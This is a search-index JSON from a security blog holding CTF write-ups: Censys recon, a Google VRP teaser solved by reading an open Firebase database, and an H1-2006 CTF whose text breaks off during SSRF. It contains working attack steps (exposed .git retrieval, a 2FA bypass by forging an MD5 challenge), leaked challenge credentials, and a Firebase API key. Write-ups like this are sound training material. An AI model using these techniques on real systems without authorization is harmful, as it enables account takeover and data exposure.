{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hello there !","text":"<p>There is not much to see here yet but you can already checkout the Blog and follow me on Twitter to know when it going to get updated.</p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/censys-ctf---writeup/","title":"Censys CTF - WriteUp","text":"<p>My writeup for the Censys CTF that ran during BlackHat 2022. Don't forget to checkout the tips and tricks section to improve your recon methodology ;)</p> <p></p>","tags":["CTF","Recon"]},{"location":"blog/censys-ctf---writeup/#arvala7space","title":"arvala7.space","text":"<p>The hunt starts here: https://search.censys.io/hosts/35.202.198.108</p> <p>We can see that there are 4 ports open:</p> <ul> <li>17/UNKNOWN</li> <li>22/SSH</li> <li>23/UNKNOWN</li> <li>80/HTTP</li> <li>443/HTTP</li> </ul> <p>Port 17 has the following banner:</p> <p>I've seen this raw strength only once before. It didn't scare me enough then. It does now. Flourish, my friend. Flourish. Dig around station.arvala7.space.</p> <p>Info</p> <p>\"I've Seen This Raw Strength Only Once Before\" is a memorable quote uttered by the character Luke Skywalker from the 2018 science fiction action film Star Wars: The Last Jedi. Online and it is now a meme.</p> <p>If we dig around the DNS records for <code>station.arvala7.space</code> we can already see our first flag in a TXT record:</p> <pre><code>station.arvala7.space. TXT \"ctf{6a935446-fba8-4cfc-9564-2c7d34f680a9}\"\n</code></pre> <p>On port 80 &amp; 443 we have the following HTML:</p> <pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Arvala-7&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Arvala-7&lt;/h1&gt;\n    &lt;iframe src=\"/cgi-bin/arvala7.cgi\" width=\"100%\" height=\"100%\"&gt;&lt;/iframe&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Checking the <code>cgi-bin</code> directory we can see a directory listing with a <code>.env</code>. The <code>.env</code> contains another flag:</p> <p>export ARVALA7_FLAG=\"ctf{067744f3-bf37-4de3-b349-b6785825d386}\"</p> <p>If we look at the history tab in Censys we can see that <code>kintan.space</code> is linked to <code>aravala7.space</code>.</p> <p>Searching for <code>arvala7.space</code> on Censys returns another IP hosted on GCP:  104.198.164.172</p> <p>The CN is <code>mobile-refinery.arvala7.space</code> and on port 80 and 443 there is a directory listing containing two files a <code>flag.txt</code>:</p> <p>ctf{85792f7f-5479-401e-9219-ceafc6a44d04}</p> <p>and an image, in the image metadata is another flag:</p> <p>ctf{89d6276d-a741-4d0e-ace4-1666ffd12a07}</p> <p>The port 10001 is open, if we connect to it using netcat we can interact with the service:</p> <pre><code>\u276f nc 104.198.164.172 10001\nI70100\n2022-08-09 17:39:50\n\nMobile Refinery\nGuild Territory\nArvala-7\n\n  TANK  PRODUCT        VOLUME    HEIGHT    WATER     TEMP  NOTES\n------  -----------  --------  --------  -------  -------  --------------------\n     1  RHYDONIUM        7744        77       17  176.348\n     2  PERAGIAN         7177        27       76  197.553\n     3  ANTHRACITE       7426       373       50  120.421\n     4  HYPERMATTER      7334       341       72  111.395  * Check tank status.\n$ help\nCommands: exit, help, shutoff, status, start, stop\n$ status 4\nStatus: ON - ctf{606f2d57-e009-4f05-87bc-07530f14d5d0}\n</code></pre>","tags":["CTF","Recon"]},{"location":"blog/censys-ctf---writeup/#kintanspace","title":"kintan.space","text":"<p>Checking the DNS we can see a reference to Keybase:</p> <pre><code>kintan.space.       A   35.202.198.108\nkintan.space.       TXT \"keybase-site-verification=Fl3sgIf2dUcm8WRi5LSYhp5aJcNxebi7zwJFoaDgSy8\"\nkintan.space.       MX  20 alt2.gmr-smtp-in.l.google.com.\nkintan.space.       MX  30 alt3.gmr-smtp-in.l.google.com.\nkintan.space.       MX  10 alt1.gmr-smtp-in.l.google.com.\nkintan.space.       MX  40 alt4.gmr-smtp-in.l.google.com.\nkintan.space.       MX  5 gmr-smtp-in.l.google.com.\nkintan.space.       NS  ns-cloud-c3.googledomains.com.\nkintan.space.       NS  ns-cloud-c1.googledomains.com.\nkintan.space.       NS  ns-cloud-c4.googledomains.com.\nkintan.space.       NS  ns-cloud-c2.googledomains.com.\n</code></pre> <p>The keybase user is: https://keybase.io/censysctf, the keybase account does not appear to lead anywhere else.</p> <p>The HTML refence other planet:</p> <ul> <li>vodran</li> <li>sriluur</li> </ul> <p>Both of them are available to register and are not referenced in the Keybase account.</p> <p>The source code has an interesting comment though:</p> <pre><code> &lt;!-- Make git clone pun --&gt;\n    &lt;meta name=\"description\" content=\"Kintan is a planet full of clones.\"&gt;\n</code></pre> <p>There is a <code>.git</code> folder at the root and the HEAD leaks a flag:</p> <p>ref: refs/heads/ctf{fbcc3e59-51dd-4d0f-8335-3d9f0409e3e0}</p> <p>Checking kintan.space on Censys leads to another IP: 35.222.118.123 and the CN <code>reactor.kintan.space</code>.</p> <p>The HTML on port 80 and 443 leaks a new flag:</p> <pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Supervolt Controls&lt;/title&gt;\n    &lt;meta http-equiv=\"Flag\" content=\"ctf{d82274e0-39e5-42d0-aa86-f6b3e0703215}\"&gt;\n</code></pre> <p>The response header contains another flag: <code>X-Censys-Ctf-Flag: ctf{08ff2d0d-fc6d-4a0d-8235-1a453890d8d2}</code></p>","tags":["CTF","Recon"]},{"location":"blog/censys-ctf---writeup/#tips-and-tricks","title":"Tips and tricks","text":"","tags":["CTF","Recon"]},{"location":"blog/censys-ctf---writeup/#censys-explore-feature","title":"Censys Explore Feature","text":"<p>The main thing I learned during this CTF was how to use the \"explore\" feature that let you discover hosts and domains using a graph.</p> <p>To use it you only need to navigate to the \"explore\" tab when looking at an host or domain, then either righ click or long click on the node to explore hosts, domains or certificate. Rinse and repeat and you should have all the relevant hosts and domains in no time:</p> <p></p>","tags":["CTF","Recon"]},{"location":"blog/censys-ctf---writeup/#uncover","title":"Uncover","text":"<p>If you need to automate some searches using Censys I recommend checking uncover by ProjectDiscovery.</p> <p>Uncover let you quickly discover exposed hosts on the internet using multiple search engines such as Shodan, FOFA, Censys and more.</p> <p>It can quickly be installed using:</p> <pre><code>go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest\n</code></pre> <p>You can just pipe the query into uncover to see the results:</p> <pre><code>\u276f echo 'arvala7.space' | uncover -e censys -silent\n35.209.32.112:22\n35.209.32.112:80\n35.209.32.112:443\n35.209.79.65:22\n35.209.79.65:23\n35.209.79.65:80\n35.209.79.65:443\n</code></pre> <p>Warning</p> <p>The Censys agent for uncover does not include Virtual Hosts. I created an issue to see if the default can be changed or if they can add an option.</p> <p>I'll let you check the documentation for more information on how to use uncover.</p>","tags":["CTF","Recon"]},{"location":"blog/google-vrp-teaser/","title":"Google VRP Teaser","text":"","tags":["CTF","Web"]},{"location":"blog/google-vrp-teaser/#introduction","title":"Introduction","text":"<p>On August 9, the @GoogleVRP Twitter account as well as multiple Googlers started teasing an event with a link to a login page as well as a video. This small blogpost exlains how to get the password and what it reveals.</p> <p></p> <p>The tweet talks about a countdown and the video description and content mention:</p> <p>Hope is not a strategy. GOO.GLE/H4CK1NGG00GL3</p> <p>Hope is not a strategy or \"Spes consilium non\" in Latin is a saying from the SRE team at Google:</p> <p>Quote</p> <p>An oft-heard SRE saying is that you should \u201cdesign a system to be as available as is required, but not much more.\u201d At Google, when designing a system, we generally target a given availability figure (e.g., 99.9%), rather than particular MTBF or MTTR figures. Once we\u2019ve achieved that availability metric, we optimize our operations for \"fast fix,\" e.g., MTTR over MTBF, accepting that failure is inevitable, and that \u201cspes consilium non est\u201d (Hope is not a strategy). SREs are often able to mitigate the user visible impact of huge problems in minutes, allowing our engineering teams to achieve high development velocity, while simultaneously earning Google a reputation for great availability.</p> <p>This saying is even on the Google CRE team patch:</p> <p></p>","tags":["CTF","Web"]},{"location":"blog/google-vrp-teaser/#reversing-firebase","title":"Reversing Firebase","text":"<p>The link redirects to an appspot website displaying a login form:</p> <p></p> <p>The application is a SPA using Angular &amp; Firebase with a Realtime Database.</p> <p>Warning</p> <p>Since the Firebase application is using a Realtime Database you should look into WebSockets communication when analyzing the traffic.</p> <p>There is a simple password form which redirects to a google search if the password is not the expected one.</p> <p>Since this is a single page application let's look at the minified JavaScript code:</p> <pre><code>class n {\n    constructor(e, s) {\n        this.authService = e,\n        this.storage = s,\n        this.authenticated = !1,\n        this.transitioning = !1,\n        this.showCountdown = !1,\n        this.title = \"Teaser Home Page\",\n        this.authFailRedirect = \"https://google.com/search?q=\",\n        !0 === this.storage.retrieve(\"teaser.authenticated\") &amp;&amp; (this.authenticated = !0,\n        this.showCountdown = !0)\n    }\n    authenticate(e) {\n        var s = this;\n        return (0,\n        W.Z)(function*() {\n            if (s.authenticated)\n                return;\n            setTimeout(()=&gt;{\n                s.startTransition()\n            }\n            , 100);\n            const a = yield s.authService.checkPassword(e);\n            s.authenticated = a,\n            a ? (s.storage.store(\"teaser.authenticated\", !0),\n            window.gtag(\"event\", \"page_view\", {\n                event_action: \"submit\",\n                event_label: \"teaser_unlock\",\n                page_location: window.location.href,\n                page_path: \"/unlock\"\n            })) : window.location.href = `${s.authFailRedirect}${e}`\n        })()\n    }\n    // ...\n}\n</code></pre> <p>The code used to check the password </p> <pre><code>ET = (() =&gt; {  \n    class n {  \n        constructor(e) {  \n            this.database = e  \n        }  \n        s(e) {  \n            var s = this;  \n            return (0, W.Z)(function*() {  \n                const a = s.database.list(\"flags/teaser\", _ =&gt; _.orderByValue().equalTo(e?.toLowerCase())).valueChanges();  \n                return (yield function ae(n, t) {  \n                    const e = \"object\" == typeof t;  \n                    return new Promise((s, a) =&gt; {  \n                        const h = new ee.Hp({  \n                            next: _ =&gt; {  \n                                s(_), h.unsubscribe()  \n                            },  \n                            error: a,  \n                            complete: () =&gt; {  \n                                e ? s(t.defaultValue) : a(new Sd)  \n                            }  \n                        });  \n                        n.subscribe(h)  \n                    })  \n                }(a))?.length &gt; 0  \n            })()  \n        }  \n    }  \n    return n.\\u0275fac = function(e) {  \n        return new(e || n)(m.LFG(yS))  \n    }, n.\\u0275prov = m.Yz7({  \n        token: n,  \n        factory: n.\\u0275fac,  \n        providedIn: \"root\"  \n    }), n  \n})();\n</code></pre> <p>If the data retrieved from the database is <code>&gt; 0</code> then <code>authenticated</code> will be <code>true</code> and this will only happen if the password that we send is the one stored in the database.</p> <p>To retrieve the password we first need the Firebase configuration which can be found in the JavaScript code:</p> <pre><code>const IT_firebase = {  \n    apiKey: \"AIzaSyBSeXZQjiyPUBkQDj-FUubN05bt50PzsgI\",  \n    authDomain: \"gweb-h4ck1ng-g00gl3.firebaseapp.com\",  \n    projectId: \"gweb-h4ck1ng-g00gl3\",  \n    storageBucket: \"gweb-h4ck1ng-g00gl3.appspot.com\",  \n    messagingSenderId: \"267897667426\",  \n    appId: \"1:267897667426:web:d839498d3f03a9957a363b\"  \n};\n</code></pre> <p>Here is the code I used to get the FLAG:</p> <pre><code>import { initializeApp } from \"firebase/app\";\nimport { getDatabase, ref, onValue} from \"firebase/database\";\n\n// See: https://firebase.google.com/docs/web/learn-more#config-object\nconst firebaseConfig = {\n    apiKey: \"AIzaSyBSeXZQjiyPUBkQDj-FUubN05bt50PzsgI\",\n    authDomain: \"gweb-h4ck1ng-g00gl3.firebaseapp.com\",\n    projectId: \"gweb-h4ck1ng-g00gl3\",\n    storageBucket: \"gweb-h4ck1ng-g00gl3.appspot.com\",\n    messagingSenderId: \"267897667426\",\n    appId: \"1:267897667426:web:d839498d3f03a9957a363b\"\n};\n\n// Initialize Firebase\nconst app = initializeApp(firebaseConfig);\nconst db = getDatabase(app);\n\nconsole.log(db);\n\n// https://firebase.google.com/docs/database/web/read-and-write#read_data_once\nconst test = ref(db, 'flags');\nonValue(test, (snapshot) =&gt; {\n    const data = snapshot.val();\n    console.log(data); // { teaser: { name: 'operationaurora' } }\n});\n</code></pre> <p>Info</p> <p>The flag <code>operationaurora</code> maybe refers to Operation Aurora a series of cyber attacks conducted by advanced persistent threats such as the Elderwood Group based in Beijing, China, with ties to the People's Liberation Army. First publicly disclosed by Google on January 12, 2010.</p> <p>Once entered a countdown is displayed ending the GMT: Friday 30 September 2022 22:00:00.</p> <p></p> <p>Any ideas what is going to happen in 5 days ?</p>","tags":["CTF","Web"]},{"location":"blog/h1-2006-ctf---writeup/","title":"H1-2006 CTF - WriteUp","text":"<p>The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more.</p> <p>We need your help! CEO @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us?</p> <p></p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#passive-reconnaissance","title":"Passive Reconnaissance","text":"","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#subdomain-enumeration","title":"Subdomain Enumeration","text":"<p>Let's start with some recon. The information we have so far is that @martenmickos has has lost his login details for BountyPay and thus can't approve the May bug bounty payments. We also have the scope which is *.bountypay.h1ctf.com</p> <p>Usually when I approach a target I'll begin with some subdomain reconnaiscance. I have a couple of aliases in my <code>~/.zshrc</code> to use subfinder and amass. I run subfinder then amass:</p> <pre><code>alias subff=\"subfinder -o subfinder.txt -v -d\"\nalias amasss=\"amass enum -config ~/amass/config.ini -ip -src -nf subfinder.txt -d\"\n</code></pre> <p>Amass results:</p> <pre><code>[Censys]          www.bountypay.h1ctf.com 3.21.98.146\n[DNS]             bountypay.h1ctf.com 3.21.98.146\n[Censys]          api.bountypay.h1ctf.com 3.21.98.146\n[Censys]          app.bountypay.h1ctf.com 3.21.98.146\n[Censys]          staff.bountypay.h1ctf.com 3.21.98.146\n[Censys]          software.bountypay.h1ctf.com 3.21.98.146\n</code></pre> <p>We can see that everything is running on the same IP 3.21.98.146. Something that is often useful is to get basic info about the IP. For this I have a small function in my <code>~/.zshrc:</code></p> <pre><code>ipinfo() {\n  http get https://ipinfo.io/$1 -b\n}\n</code></pre> <p>In this case we can see that the IP belongs to Amazon which could be useful if we encounter a SSRF later on:</p> <pre><code>{\n    \"city\": \"Columbus\",\n    \"country\": \"US\",\n    \"hostname\": \"ec2-3-21-98-146.us-east-2.compute.amazonaws.com\",\n    \"ip\": \"3.21.98.146\",\n    \"loc\": \"40.1357,-83.0076\",\n    \"org\": \"AS16509 Amazon.com, Inc.\",\n    \"postal\": \"43236\",\n    \"readme\": \"https://ipinfo.io/missingauth\",\n    \"region\": \"Ohio\",\n    \"timezone\": \"America/New_York\"\n}\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#mapping","title":"Mapping","text":"<p>I usually follow up with some visual recon using Aquatone:</p> <pre><code>aqua='cat amass.txt | aquatone -ports xlarge'\n</code></pre> <p>Here I skipped Aquatone since it appears that we only have 5 targets:</p> <ul> <li>bountypay.h1ctf.com / www.bountypay.h1ctf.com</li> <li>api.bountypay.h1ctf.com</li> <li>app.bountypay.h1ctf.com</li> <li>staff.bountypay.h1ctf.com</li> <li>software.bountypay.h1ctf.com</li> </ul>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#bountypayh1ctfcom","title":"bountypay.h1ctf.com","text":"<p>bountypay.h1ctf.com has a dropdown menu that redirects to:</p> <ul> <li>Customers - app.bountypay.h1ctf.com</li> <li>Staff - staff.bountypay.h1ctf.com</li> </ul> <p>Info</p> <p>You might be wondering what are those orange stripes in the screenshot, this is because I'm using autochrome a great tool which downloads, installs, and configures a shiny new copy of Chromium for pentesting. If you haven't already I encourage you to check it out ! If you are more a Firefox kind of person then BitK just released basically the same tool for Firefox named PwnFox.</p> <p>The other interesting thing we can note is that there is a reference to a Twitter account in the source of the page:</p> <pre><code>&lt;div style=\"position:absolute;bottom:7px;right:7px\" class=\"pull-right\"&gt;\n&lt;a href=\"https://twitter.com/bountypayhq\" class=\"twitter-follow-button pull-right\" data-show-count=\"false\"&gt;&lt;/a&gt;&lt;script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"&gt;&lt;/script&gt;\n&lt;/div&gt;\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#twitter","title":"Twitter","text":"<p>On @BountypayHQ profile page there are only 3 tweets including one with a reference to a new employee named Sandra:</p> <p></p> <p>BountyPayHQ is only following 3 accounts and we can see that among them, is the new employee SandraA76708114 aka Sandra Allison:</p> <p></p> <p>If we look at her profile there is only 1 tweet with a photo including what appears to be her employee ID: <code>STF:8FJ3KFISL3</code> which will be useful later on:</p> <p></p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#appbountypayh1ctfcom","title":"app.bountypay.h1ctf.com","text":"<p>On app.bountypay.h1ctf.com at first sight there is not much to see, there is only a login form which gives su an error when submitting invalid credentials.</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#apibountypayh1ctfcom","title":"api.bountypay.h1ctf.com","text":"<p>On the api the only thing out of the ordinary is a link that redirects to Google Search, we will come back to this later on.</p> <pre><code>&lt;a href=\"/redirect?url=https://www.google.com/search?q=REST+API\"&gt;REST API&lt;/a&gt;\n</code></pre>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#staffbountypayh1ctfcom","title":"staff.bountypay.h1ctf.com","text":"<p>The staff application looks really similar to the app one. We are presented with a login form which throws an error with invalid credentials. Something we can note is the <code>template</code> parameter in the URL used to load the login template.</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#softwarebountypayh1ctfcom","title":"software.bountypay.h1ctf.com","text":"<p>The software subdomain appear to be only accessible from a specific IP.</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#active-reconnaissance","title":"Active Reconnaissance","text":"","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#directory-enumeration","title":"Directory Enumeration","text":"<p>After the passive reconnaiscance I usually do some directory and file bruteforcing. My goto tool for this now is ffuf. FFuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go.</p> <pre><code>ffuf -w raft-large-directories.txt \\\n-o ffuf-directories-app.json \\\n-u https://app.bountypay.h1ctf.com/FUZZ/ \\\n-t 10 \\\n-replay-proxy http://127.0.0.1:8080\n</code></pre> <p>ffuf output:</p> <pre><code>________________________________________________\n\n :: Method           : GET\n :: URL              : https://app.bountypay.h1ctf.com/FUZZ/\n :: Output file      : ffuf-directories-app.json\n :: File format      : json\n :: Follow redirects : false\n :: Calibration      : false\n :: ReplayProxy      : http://127.0.0.1:8080\n :: Timeout          : 10\n :: Threads          : 10\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nimages                  [Status: 403, Size: 178, Words: 5, Lines: 8]\njs                      [Status: 403, Size: 178, Words: 5, Lines: 8]\ncss                     [Status: 403, Size: 178, Words: 5, Lines: 8]\nlogout                  [Status: 302, Size: 0, Words: 1, Lines: 1]\ncgit                    [Status: 403, Size: 170, Words: 5, Lines: 7]\n:: Progress: [62275/62275]\u00a0:: Job [1/1] :: 80 req/sec :: Duration: [0:12:54] :: Errors: 3 ::\n</code></pre> <p>There is one entry that looks interesting <code>cgit</code>, which might indicate that we are in the presence of a misconfigured NGINX web server with a <code>.git</code> folder that is publicly available. Let's see if we can access the config file. This request was made inside Burp but I'll use HTTPie output for the writeup since it will make the report easier to read: </p> <pre><code>http get https://app.bountypay.h1ctf.com/.git/config\n</code></pre> <pre><code>HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/octet-stream\nDate: Thu, 04 Jun 2020 16:41:44 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n[remote \"origin\"]\n    url = https://github.com/bounty-pay-code/request-logger.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n    remote = origin\n    merge = refs/heads/master\n</code></pre> <p>Bingo ! The config file gives us the URL of the repository. </p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#souce-code-analysis","title":"Souce code analysis","text":"<p>The GitHub account has only one repository with one file and one commit. We can see that the PHP file is logging request data into a file named <code>bp_web_trace.log</code>.</p> logger.php<pre><code>&lt;?php\n\n$data = array(\n  'IP'        =&gt;  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =&gt;  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =&gt;  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =&gt;  array(\n      'GET'   =&gt;  $_GET,\n      'POST'  =&gt;  $_POST\n  )\n);\n\nfile_put_contents(\n  'bp_web_trace.log',\n  date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",\n  FILE_APPEND\n);\n</code></pre> <p>Let's see if the file is available on the server.</p> <pre><code>http get https://app.bountypay.h1ctf.com/bp_web_trace.log\n</code></pre> <pre><code>HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/octet-stream\nDate: Thu, 04 Jun 2020 16:46:48 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n</code></pre> <p>We can easily decode the base64 encoded data, I'm either using Hackvertor inside of Burp or CyberChef for this kind of thing:</p> <pre><code>{\n    \"IP\": \"192.168.1.1\",\n    \"METHOD\": \"GET\",\n    \"PARAMS\": {\n        \"GET\": [],\n        \"POST\": []\n    },\n    \"URI\": \"/\"\n}\n{\n    \"IP\": \"192.168.1.1\",\n    \"METHOD\": \"POST\",\n    \"PARAMS\": {\n        \"GET\": [],\n        \"POST\": {\n            \"password\": \"V7h0inzX\",\n            \"username\": \"brian.oliver\"\n        }\n    },\n    \"URI\": \"/\"\n}\n{\n    \"IP\": \"192.168.1.1\",\n    \"METHOD\": \"POST\",\n    \"PARAMS\": {\n        \"GET\": [],\n        \"POST\": {\n            \"challenge_answer\": \"bD83Jk27dQ\",\n            \"password\": \"V7h0inzX\",\n            \"username\": \"brian.oliver\"\n        }\n    },\n    \"URI\": \"/\"\n}\n{\n    \"IP\": \"192.168.1.1\",\n    \"METHOD\": \"GET\",\n    \"PARAMS\": {\n        \"GET\": {\n            \"month\": \"04\",\n            \"year\": \"2020\"\n        },\n        \"POST\": []\n    },\n    \"URI\": \"/statements\"\n}\n</code></pre> <p>The most interesting one is the third where we can see a username, password and 2FA challenge answer. If we try to login using the credentials found in the log file we get asked for a 10 characters password sent to the user's phone:</p> <p></p> <p>The code found in the log file is invalid and bruteforcing the code is usually not the way to go in CTFs. </p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#bypassing-2fa","title":"Bypassing 2FA","text":"<p>Let's analyze the request being sent when submitting the challlenge answer:</p> <pre><code>POST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 108\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/orange\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\n\nusername=brian.oliver&amp;password=V7h0inzX&amp;challenge=8718040845a881ff0da135418b2811b2&amp;challenge_answer=V7h0inzX\n</code></pre> <p>We can see that there is an extra parameter named <code>challenge</code> . The value appears to be an MD5 hash. The hash is different after each login request. After a bit of trial and error we can guess that the <code>challenge</code> should be an MD5 hash of the <code>challenge_answer</code>. When this is the case we can successfully login ! \ud83e\udd73</p> <pre><code>http -f post https://app.bountypay.h1ctf.com \\\nusername=brian.oliver \\\npassword=V7h0inzX \\\nchallenge=5828c689761cce705a1c84d9b1a1ed5e \\\nchallenge_answer=bD83Jk27dQ\n</code></pre> <pre><code>HTTP/1.1 302 Found\nConnection: keep-alive\nContent-Type: text/html; charset=UTF-8\nDate: Thu, 04 Jun 2020 16:51:11 GMT\nLocation: /\nServer: nginx/1.14.0 (Ubuntu)\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sat, 04-Jul-2020 16:51:11 GMT; Max-Age=2592000\nTransfer-Encoding: chunked\n</code></pre> <p></p> <p>Info</p> <p>We can note that the <code>challenge</code> parameter has been omitted in the log file, probably to make this step a little bit harder.</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#server-side-request-forgery","title":"Server Side Request Forgery","text":"<p>Once we are logged in there is not much we can do except for loading transactions for our account.</p> <p></p> <p>Loading the transactions:</p> <pre><code>http get https://app.bountypay.h1ctf.com/statements\\?month\\=02\\&amp;year\\=2020 \\\nCookie:'token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9'\n</code></pre> <pre><code>HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Type: application/json\nDate: Thu, 04 Jun 2020 16:54:38 GMT\nServer: nginx/1.14.0 (Ubuntu)\nTransfer-Encoding: chunked\n\n{\n    \"data\": \"{\\\"description\\\":\\\"Transactions for 2020-02\\\",\\\"transactions\\\":[]}\",\n    \"url\": \"https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=02&amp;year=2020\"\n}\n</code></pre> <p>The response contains two interesting piece of information. The transaction data, our account does not appear to have access to any transactions, and a <code>url</code> which seems to indicate that the server is actually making a request to  api.bountypay.h1ctf.com.</p> <p>If we look into the JavaScript files we can also see that there is an endpoint that is used to pay transactions:</p> /js/app.js<pre><code>$(\".loadTxns\").click(function() {\n  let t = $('select[name=\"month\"]').val(),\n    e = $('select[name=\"year\"]').val();\n  $(\".txn-panel\").html(\"\"), $.get(\"/statements?month=\" + t + \"&amp;year=\" + e, function(t) {\n    if (t.hasOwnProperty(\"data\")) {\n      let e = JSON.parse(t.data);\n      if (e.hasOwnProperty(\"transactions\"))\n        if (0 == e.transactions.length) $(\".txn-panel\").html('&lt;div class=\"text-center\" style=\"margin:10px\"&gt;No Transactions To Process&lt;/div&gt;');\n        else {\n          let t = \"\";\n          t += '&lt;table style=\"margin:0\" class=\"table\"&gt;&lt;tr&gt;&lt;th&gt;Hacker(s)&lt;/th&gt;&lt;th class=\"text-center\"&gt;Program(s)&lt;/th&gt;&lt;th class=\"text-center\"&gt;Reports(s)&lt;/th&gt;&lt;th class=\"text-center\"&gt;Pay Out&lt;/th&gt;&lt;th class=\"text-center\"&gt;Action&lt;/th&gt;&lt;/tr&gt;', $.each(e.transactions, function(e, s) {\n            t += \"&lt;tr&gt;&lt;td&gt;\" + s.hackers + '&lt;/td&gt;&lt;td class=\"text-center\"&gt;' + s.programs + '&lt;/td&gt;&lt;td class=\"text-center\"&gt;' + s.reports + '&lt;/td&gt;&lt;td class=\"text-center\"&gt;' + s.amount + '&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;a href=\"/pay/' + s.id + \"/\" + s.hash + '\" class=\"btn btn-sm btn-success\"&gt;Pay&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;'\n          }), t += \"&lt;/table&gt;\", $(\".txn-panel\").html(t)\n        }\n      else alert(\"Invalid Response From The Server\")\n    } else alert(\"Invalid Response From The Server\")\n  })\n});\n</code></pre> <p>If we try to guess the <code>id</code> and <code>hash</code> for the <code>GET /pay/{id}/{hash}</code> endpoint we get an error from the server: <code>Invalid payment details</code>. Let's leave this endpoint for now and focus on the retrieval of transactions.</p> <p>Looking back at the response for the transaction retrieval request we can assume that the application is making an HTTP request to the <code>url</code> parameter. After some testing it appears that <code>month</code> and <code>year</code> parameter are not vulnerable.</p> <p>Something we did not check yet is the content of our session cookie:</p> 